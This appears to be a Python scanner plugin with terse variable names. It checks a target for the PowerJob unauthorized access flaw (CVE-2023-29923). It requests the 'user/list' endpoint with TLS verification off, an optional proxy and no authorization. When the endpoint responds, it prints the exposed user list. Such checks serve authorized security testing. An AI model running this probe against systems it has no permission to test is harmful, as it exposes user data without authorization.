import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def a1dl1(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(url1+'user/list',cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if '{"success":true' in cd.text or '"data":[' in cd.text:
            uj='[+]漏洞存在\n'+cd.text
        else:
            uj='[-]漏洞不存在'
    except Exception as aaa:
        uj='[-]请求错误'
def a1jg8():
    global uj
    return '--------------------------------------------------\n[ PowerJob未授权访问漏洞(CVE-2023-29923) ]\n\n'+ str (uj)+'\n'
def a1u8(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
